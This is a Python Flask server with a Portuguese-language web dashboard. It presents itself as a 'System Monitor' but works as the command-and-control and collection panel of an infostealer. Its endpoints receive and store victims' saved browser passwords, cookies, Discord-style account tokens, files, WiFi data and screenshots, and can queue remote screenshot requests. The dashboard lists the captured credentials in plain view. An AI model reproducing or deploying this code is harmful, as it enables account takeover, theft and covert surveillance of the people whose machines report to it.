#!/usr/bin/env python3
"""
System Monitor Dashboard - Versão ORIGINAL com Novos Endpoints
"""

import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)

# CORS manual
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

# Dados em memoria
endpoints = {}
metrics_data = []
endpoint_screenshots = {}
screenshot_requests = {}
endpoint_tokens = {}
endpoint_cookies = {}
endpoint_passwords = {}
endpoint_files = {}
full_reports = {}
uploaded_files = {}

@app.route('/')
def index():
    return HTML_TEMPLATE

@app.route('/api/register', methods=['POST', 'OPTIONS'])
def register_endpoint():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', 'Unknown'),
            'external_ip': data.get('external_ip', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'timestamp': datetime.now().isoformat(),
            'status': 'online',
            'last_seen': datetime.now().strftime('%H:%M:%S')
        }
        
        print(f"✅ Endpoint registrado: {endpoint_id}")
        return jsonify({'status': 'success', 'message': 'Endpoint registered'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/metrics', methods=['POST', 'OPTIONS'])
def receive_metrics():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        metrics = data.get('metrics', [])
        
        for metric in metrics:
            metric['endpoint_id'] = endpoint_id
            metric['received_at'] = datetime.now().isoformat()
            metrics_data.append(metric)
        
        print(f"📊 Métricas recebidas de {endpoint_id}: {len(metrics)} itens")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tokens', methods=['POST', 'OPTIONS'])
def receive_tokens():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        tokens = data.get('tokens', [])
        
        endpoint_tokens[endpoint_id] = {
            'tokens': tokens,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🔑 Tokens recebidos de {endpoint_id}: {len(tokens)} tokens")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/cookies', methods=['POST', 'OPTIONS'])
def receive_cookies():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        cookies = data.get('cookies', [])
        
        endpoint_cookies[endpoint_id] = {
            'cookies': cookies,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🍪 Cookies recebidos de {endpoint_id}: {len(cookies)} cookies")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/passwords', methods=['POST', 'OPTIONS'])
def receive_passwords():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        passwords = data.get('passwords', [])
        
        endpoint_passwords[endpoint_id] = {
            'passwords': passwords,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🔒 Senhas recebidas de {endpoint_id}: {len(passwords)} senhas")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/files', methods=['POST', 'OPTIONS'])
def receive_files():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        files = data.get('files', [])
        
        if endpoint_id not in endpoint_files:
            endpoint_files[endpoint_id] = []
        
        endpoint_files[endpoint_id].extend(files)
        
        print(f"📁 Arquivos recebidos de {endpoint_id}: {len(files)} arquivos")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# NOVOS ENDPOINTS PARA RELATÓRIOS COMPLETOS
@app.route('/api/full_report', methods=['POST', 'OPTIONS'])
def receive_full_report():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        # Salva o relatório completo
        full_reports[endpoint_id] = {
            'metadata': data,
            'received_at': datetime.now().isoformat()
        }
        
        print(f"📋 Relatório completo recebido de {endpoint_id}")
        print(f"   Senhas: {data.get('total_passwords', 0)}")
        print(f"   Cookies: {data.get('total_cookies', 0)}")
        print(f"   Tokens: {data.get('total_tokens', 0)}")
        print(f"   WiFi: {data.get('wifi_networks', 0)}")
        print(f"   Screenshot: {'Sim' if data.get('screenshot_included') else 'Não'}")
        
        return jsonify({'status': 'success', 'message': 'Full report received'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot_upload', methods=['POST', 'OPTIONS'])
def upload_screenshot():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        if 'screenshot' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file uploaded'}), 400
        
        file = request.files['screenshot']
        endpoint_id = request.form.get('endpoint_id', 'unknown')
        
        if file:
            # Converte para base64
            image_data = file.read()
            image_base64 = base64.b64encode(image_data).decode('utf-8')
            
            endpoint_screenshots[endpoint_id] = {
                'image': image_base64,
                'filename': file.filename,
                'timestamp': datetime.now().isoformat()
            }
            
            print(f"📸 Screenshot upload recebido de {endpoint_id}: {file.filename}")
        
        return jsonify({'status': 'success', 'message': 'Screenshot uploaded'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/complete_report_upload', methods=['POST', 'OPTIONS'])
def upload_complete_report():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        if 'report' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file uploaded'}), 400
        
        file = request.files['report']
        endpoint_id = request.form.get('endpoint_id', 'unknown')
        
        if file:
            # Salva informações do arquivo
            uploaded_files[endpoint_id] = {
                'filename': file.filename,
                'size': len(file.read()),
                'content_type': file.content_type,
                'timestamp': datetime.now().isoformat()
            }
            
            # Volta ao início do arquivo para salvar
            file.seek(0)
            
            # Salva o arquivo no disco
            save_path = f"uploads/{endpoint_id}_{file.filename}"
            os.makedirs('uploads', exist_ok=True)
            file.save(save_path)
            
            print(f"📦 Relatório completo upload recebido de {endpoint_id}")
            print(f"   Arquivo: {file.filename}")
            print(f"   Tamanho: {uploaded_files[endpoint_id]['size']} bytes")
            print(f"   Salvo em: {save_path}")
        
        return jsonify({'status': 'success', 'message': 'Complete report uploaded'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot', methods=['POST', 'OPTIONS'])
def receive_screenshot():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        image_base64 = data.get('image', '')
        
        if image_base64:
            endpoint_screenshots[endpoint_id] = {
                'image': image_base64,
                'timestamp': datetime.now().isoformat()
            }
            print(f"📸 Screenshot recebido de {endpoint_id}!")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST', 'OPTIONS'])
def request_screenshot(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        screenshot_requests[endpoint_id] = {
            'requested': True,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"📸 Screenshot solicitado para: {endpoint_id}")
        return jsonify({
            'status': 'success', 
            'message': f'Screenshot solicitado para {endpoint_id}'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>', methods=['GET', 'OPTIONS'])
def check_screenshot_request(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        request_data = screenshot_requests.get(endpoint_id, {})
        return jsonify({
            'request_screenshot': request_data.get('requested', False),
            'timestamp': request_data.get('timestamp')
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>/clear', methods=['POST', 'OPTIONS'])
def clear_screenshot_request(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        if endpoint_id in screenshot_requests:
            del screenshot_requests[endpoint_id]
            print(f"🧹 Solicitação limpa para: {endpoint_id}")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ENDPOINTS DE LEITURA
@app.route('/api/endpoints', methods=['GET', 'OPTIONS'])
def get_endpoints():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoints)

@app.route('/api/metrics_data', methods=['GET', 'OPTIONS'])
def get_metrics_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(metrics_data)

@app.route('/api/screenshots', methods=['GET', 'OPTIONS'])
def get_screenshots():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_screenshots)

@app.route('/api/full_reports', methods=['GET', 'OPTIONS'])
def get_full_reports():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(full_reports)

@app.route('/api/uploaded_files', methods=['GET', 'OPTIONS'])
def get_uploaded_files():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(uploaded_files)

@app.route('/api/tokens_data', methods=['GET', 'OPTIONS'])
def get_tokens_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_tokens)

@app.route('/api/cookies_data', methods=['GET', 'OPTIONS'])
def get_cookies_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_cookies)

@app.route('/api/passwords_data', methods=['GET', 'OPTIONS'])
def get_passwords_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_passwords)

@app.route('/api/files_data', methods=['GET', 'OPTIONS'])
def get_files_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_files)

# Template HTML ORIGINAL
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Monitor Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f0f23;
            color: #e0e0e0;
            min-height: 100vh;
            position: relative;
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 40px; }
        .header h1 { 
            font-size: 3em; 
            margin-bottom: 10px; 
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }
        .header p { color: #9ca3af; font-size: 1.1rem; }
        
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
            gap: 25px; 
            margin-bottom: 50px;
        }
        .stat-card { 
            background: linear-gradient(135deg, rgba(124, 58, 237, 0.1) 0%, rgba(168, 85, 247, 0.1) 100%);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 16px; 
            padding: 25px; 
            text-align: center;
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.2);
        }
        .stat-value { 
            font-size: 2.5em; 
            font-weight: 700; 
            color: #a855f7;
            margin-bottom: 5px;
        }
        .stat-label { color: #9ca3af; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
        
        .tabs-container { 
            display: flex; 
            margin-bottom: 30px;
            background: rgba(17, 17, 27, 0.6);
            border-radius: 12px;
            padding: 5px;
        }
        .tab { 
            background: transparent; 
            color: #9ca3af; 
            border: none; 
            padding: 15px 25px; 
            cursor: pointer;
            border-radius: 8px;
            font-size: 0.95rem;
            transition: all 0.3s ease;
            flex: 1;
        }
        .tab.active { 
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
        }
        .tab:hover:not(.active) { background: rgba(124, 58, 237, 0.1); }
        
        .tab-content { display: none; animation: slideIn 0.5s ease; }
        .tab-content.active { display: block; }
        
        .cards-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); 
            gap: 25px; 
        }
        .card { 
            background: linear-gradient(135deg, rgba(17, 17, 27, 0.8) 0%, rgba(31, 31, 46, 0.8) 100%);
            border: 1px solid rgba(124, 58, 237, 0.1);
            border-radius: 16px; 
            padding: 25px;
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease;
        }
        .card:hover { transform: translateY(-3px); }
        .card h3 { 
            color: #a855f7; 
            margin-bottom: 20px; 
            font-size: 1.3rem;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
        }
        .card p { margin: 8px 0; color: #e0e0e0; }
        .card strong { color: #a855f7; }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .back-btn {
            background: rgba(124, 58, 237, 0.2);
            color: #a855f7;
            border: 1px solid rgba(124, 58, 237, 0.3);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            margin-bottom: 20px;
            transition: all 0.3s ease;
        }
        .back-btn:hover {
            background: rgba(124, 58, 237, 0.3);
        }
        .data-section {
            background: rgba(10, 10, 15, 0.6);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .data-section h3 {
            color: #a855f7;
            font-size: 1.1rem;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
        }
        .token-card, .cookie-card, .password-card {
            background: rgba(168, 85, 247, 0.1);
            border: 1px solid rgba(168, 85, 247, 0.2);
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            word-break: break-all;
        }
        .screenshot-img {
            max-width: 100%;
            border-radius: 12px;
            border: 2px solid rgba(124, 58, 237, 0.3);
        }
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
        .refresh-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border: none;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 24px;
            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.3);
            transition: transform 0.3s ease;
        }
        .refresh-btn:hover {
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>System Monitor</h1>
            <p>Painel de Monitoramento Completo</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalEndpoints">0</div>
                <div class="stat-label">Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="onlineEndpoints">0</div>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalMetrics">0</div>
                <div class="stat-label">Métricas</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalScreenshots">0</div>
                <div class="stat-label">Screenshots</div>
            </div>
        </div>

        <div class="tabs-container">
            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
            <button class="tab" onclick="showTab('screenshot')">Screenshot</button>
            <button class="tab" onclick="showTab('data')">Dados</button>
        </div>

        <div id="endpoints" class="tab-content active">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Endpoints Monitorados</h2>
            <div class="cards-grid" id="endpointsList">
                <div style="color: #6b7280; text-align: center; padding: 40px;">Carregando...</div>
            </div>
        </div>

        <div id="screenshot" class="tab-content">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Screenshot Manual</h2>
            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
                <select id="endpointSelect" style="width: 100%; max-width: 400px; padding: 14px; background: rgba(10, 10, 15, 0.8); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 12px; color: #e0e0e0; font-size: 0.95rem; margin-bottom: 20px;" onchange="selectEndpoint()">
                    <option value="">Selecione um endpoint...</option>
                </select>
                <button id="screenshotBtn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 0.9rem; font-weight: 500; margin-bottom: 20px;" onclick="requestScreenshot()" disabled>📸 Capturar Screenshot</button>
                <div id="screenContent" style="background: rgba(10, 10, 15, 0.9); border-radius: 16px; padding: 20px; text-align: center; min-height: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
                    <div style="color: #6b7280;">Selecione um endpoint</div>
                </div>
            </div>
        </div>

        <div id="data" class="tab-content">
            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Menu de Dados</h2>
            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px;">
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('tokens')">🔑 Tokens</button>
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('cookies')">🍪 Cookies</button>
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('passwords')">🔒 Senhas</button>
                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('files')">📁 Arquivos</button>
                </div>
                
                <div id="dataContent" style="min-height: 400px;">
                    <div style="text-align: center; padding: 40px; color: #6b7280;">Selecione uma categoria acima</div>
                </div>
            </div>
        </div>
    </div>

    <button class="refresh-btn" onclick="loadAllData()">🔄</button>

    <script>
        let currentEndpoint = null;
        let currentCategory = null;

        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        function showDataCategory(category) {
            currentCategory = category;
            const contentDiv = document.getElementById('dataContent');
            
            switch(category) {
                case 'tokens':
                    loadTokens();
                    break;
                case 'cookies':
                    loadCookies();
                    break;
                case 'passwords':
                    loadPasswords();
                    break;
                case 'files':
                    loadFiles();
                    break;
            }
        }

        async function loadEndpoints() {
            try {
                const response = await fetch('/api/endpoints');
                const endpoints = await response.json();
                
                const container = document.getElementById('endpointsList');
                container.innerHTML = '';
                
                Object.values(endpoints).forEach(endpoint => {
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.innerHTML = \`
                        <h3>\${endpoint.hostname}</h3>
                        <p><strong>ID:</strong> \${endpoint.id}</p>
                        <p><strong>Usuário:</strong> \${endpoint.user}</p>
                        <p><strong>IP Local:</strong> \${endpoint.ip_address}</p>
                        <p><strong>IP Externo:</strong> \${endpoint.external_ip}</p>
                        <p><strong>Plataforma:</strong> \${endpoint.platform}</p>
                        <p><strong>RAM:</strong> \${endpoint.ram}</p>
                        <p><strong>Status:</strong> 🟢 Online</p>
                        <p><strong>Visto:</strong> \${endpoint.last_seen}</p>
                        <button class="tab" style="margin-top: 15px; padding: 8px 16px;" onclick="requestScreenshot('\${endpoint.id}')">📸 Screenshot</button>
                    \`;
                    container.appendChild(div);
                });
                
                document.getElementById('totalEndpoints').textContent = Object.keys(endpoints).length;
                document.getElementById('onlineEndpoints').textContent = Object.keys(endpoints).length;
                
                // Atualiza o select de endpoints
                const select = document.getElementById('endpointSelect');
                select.innerHTML = '<option value="">Selecione um endpoint...</option>';
                Object.keys(endpoints).forEach(id => {
                    const option = document.createElement('option');
                    option.value = id;
                    option.textContent = \`\${endpoints[id].hostname} (\${id})\`;
                    select.appendChild(option);
                });
            } catch (error) {
                console.error('Error loading endpoints:', error);
            }
        }

        async function loadTokens() {
            try {
                const response = await fetch('/api/tokens_data');
                const tokens = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>🔑 Tokens Capturados</h3><div id="tokensList"></div></div>';
                
                const tokensList = document.getElementById('tokensList');
                tokensList.innerHTML = '';
                
                Object.entries(tokens).forEach(([endpoint_id, data]) => {
                    data.tokens.forEach(token => {
                        const div = document.createElement('div');
                        div.className = 'token-card';
                        div.innerHTML = \`
                            <strong>Endpoint:</strong> \${endpoint_id}<br>
                            <strong>Token:</strong> \${token.token || 'N/A'}<br>
                            <strong>Válido:</strong> \${token.valid ? '✅' : '❌'}<br>
                            \${token.account ? \`<strong>Usuário:</strong> \${token.account.username}#\${token.account.discriminator}<br>\` : ''}
                        \`;
                        tokensList.appendChild(div);
                    });
                });
                
                if (Object.keys(tokens).length === 0) {
                    tokensList.innerHTML = '<div class="empty-state">Nenhum token encontrado</div>';
                }
            } catch (error) {
                console.error('Error loading tokens:', error);
            }
        }

        async function loadCookies() {
            try {
                const response = await fetch('/api/cookies_data');
                const cookies = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>🍪 Cookies do Navegador</h3><div id="cookiesList"></div></div>';
                
                const cookiesList = document.getElementById('cookiesList');
                cookiesList.innerHTML = '';
                
                Object.entries(cookies).forEach(([endpoint_id, data]) => {
                    data.cookies.forEach(cookie => {
                        const div = document.createElement('div');
                        div.className = 'cookie-card';
                        div.innerHTML = \`
                            <strong>Endpoint:</strong> \${endpoint_id}<br>
                            <strong>Host:</strong> \${cookie.host}<br>
                            <strong>Nome:</strong> \${cookie.name}<br>
                            <strong>Valor:</strong> \${cookie.value.substring(0, 100)}\${cookie.value.length > 100 ? '...' : ''}<br>
                        \`;
                        cookiesList.appendChild(div);
                    });
                });
                
                if (Object.keys(cookies).length === 0) {
                    cookiesList.innerHTML = '<div class="empty-state">Nenhum cookie encontrado</div>';
                }
            } catch (error) {
                console.error('Error loading cookies:', error);
            }
        }

        async function loadPasswords() {
            try {
                const response = await fetch('/api/passwords_data');
                const passwords = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>🔒 Senhas Salvas</h3><div id="passwordsList"></div></div>';
                
                const passwordsList = document.getElementById('passwordsList');
                passwordsList.innerHTML = '';
                
                Object.entries(passwords).forEach(([endpoint_id, data]) => {
                    data.passwords.forEach(password => {
                        const div = document.createElement('div');
                        div.className = 'password-card';
                        div.innerHTML = \`
                            <strong>Endpoint:</strong> \${endpoint_id}<br>
                            <strong>Navegador:</strong> \${password.browser}<br>
                            <strong>URL:</strong> \${password.url}<br>
                            <strong>Usuário:</strong> \${password.username}<br>
                            <strong>Senha:</strong> \${password.password}<br>
                        \`;
                        passwordsList.appendChild(div);
                    });
                });
                
                if (Object.keys(passwords).length === 0) {
                    passwordsList.innerHTML = '<div class="empty-state">Nenhuma senha encontrada</div>';
                }
            } catch (error) {
                console.error('Error loading passwords:', error);
            }
        }

        async function loadFiles() {
            try {
                const response = await fetch('/api/files_data');
                const files = await response.json();
                
                const contentDiv = document.getElementById('dataContent');
                contentDiv.innerHTML = '<div class="data-section"><h3>📁 Arquivos Recebidos</h3><div id="filesList"></div></div>';
                
                const filesList = document.getElementById('filesList');
                filesList.innerHTML = '';
                
                Object.entries(files).forEach(([endpoint_id, data]) => {
                    data.files.forEach(file => {
                        const div = document.createElement('div');
                        div.className = 'token-card';
                        div.innerHTML = \`
                            <strong>Endpoint:</strong> \${endpoint_id}<br>
                            <strong>Nome:</strong> \${file.name || file.filename}<br>
                            <strong>Tamanho:</strong> \${file.size ? (file.size / 1024).toFixed(2) + ' KB' : 'N/A'}<br>
                            <strong>Tipo:</strong> \${file.type || file.content_type}<br>
                        \`;
                        filesList.appendChild(div);
                    });
                });
                
                if (Object.keys(files).length === 0) {
                    filesList.innerHTML = '<div class="empty-state">Nenhum arquivo encontrado</div>';
                }
            } catch (error) {
                console.error('Error loading files:', error);
            }
        }

        async function loadScreenshots() {
            try {
                const response = await fetch('/api/screenshots');
                const screenshots = await response.json();
                
                const container = document.getElementById('screenContent');
                container.innerHTML = '';
                
                Object.entries(screenshots).forEach(([endpoint_id, screenshot]) => {
                    const div = document.createElement('div');
                    div.innerHTML = \`
                        <h3 style="color: #a855f7; margin-bottom: 15px;">\${endpoint_id}</h3>
                        <p style="color: #9ca3af; margin-bottom: 15px;"><strong>Data:</strong> \${new Date(screenshot.timestamp).toLocaleString()}</p>
                        \${screenshot.image ? \`<img src="data:image/png;base64,\${screenshot.image}" class="screenshot-img" alt="Screenshot">\` : ''}
                    \`;
                    container.appendChild(div);
                });
                
                document.getElementById('totalScreenshots').textContent = Object.keys(screenshots).length;
                
                if (Object.keys(screenshots).length === 0) {
                    container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
                }
            } catch (error) {
                console.error('Error loading screenshots:', error);
            }
        }

        function selectEndpoint() {
            const select = document.getElementById('endpointSelect');
            currentEndpoint = select.value;
            const btn = document.getElementById('screenshotBtn');
            
            if (currentEndpoint) {
                btn.disabled = false;
                btn.style.opacity = '1';
            } else {
                btn.disabled = true;
                btn.style.opacity = '0.5';
            }
        }

        async function requestScreenshot(endpointId) {
            const id = endpointId || currentEndpoint;
            if (!id) {
                alert('Selecione um endpoint primeiro');
                return;
            }
            
            try {
                const response = await fetch(\`/api/request_screenshot/\${id}\`, { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    alert(\`Screenshot solicitado para \${id}!\`);
                    // Verifica novamente após 5 segundos
                    setTimeout(() => {
                        loadScreenshots();
                        if (currentEndpoint === id) {
                            selectEndpoint();
                        }
                    }, 5000);
                } else {
                    alert(\`Erro: \${result.message}\`);
                }
            } catch (error) {
                alert('Erro ao solicitar screenshot');
            }
        }

        function loadAllData() {
            loadEndpoints();
            loadScreenshots();
            
            // Carrega métricas totais
            fetch('/api/metrics_data')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('totalMetrics').textContent = data.length;
                })
                .catch(error => console.error('Error loading metrics:', error));
        }

        // Carrega dados iniciais
        loadAllData();
        
        // Atualiza a cada 30 segundos
        setInterval(loadAllData, 30000);
        
        // Verifica screenshots solicitadas a cada 10 segundos
        setInterval(() => {
            if (currentEndpoint) {
                fetch(\`/api/screenshot_requests/\${currentEndpoint}\`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.request_screenshot) {
                            loadScreenshots();
                        }
                    })
                    .catch(error => console.error('Error checking screenshot request:', error));
            }
        }, 10000);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    print("🚀 Iniciando System Monitor ORIGINAL...")
    print("📡 Endpoints disponíveis:")
    print("   - POST /api/register")
    print("   - POST /api/metrics")
    print("   - POST /api/tokens")
    print("   - POST /api/cookies")
    print("   - POST /api/passwords")
    print("   - POST /api/files")
    print("   - POST /api/full_report")
    print("   - POST /api/screenshot_upload")
    print("   - POST /api/complete_report_upload")
    print("   - GET  /api/endpoints")
    print("   - GET  /api/full_reports")
    print("   - GET  /api/tokens_data")
    print("   - GET  /api/cookies_data")
    print("   - GET  /api/passwords_data")
    print("   - GET  /api/screenshots")
    print()
    
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
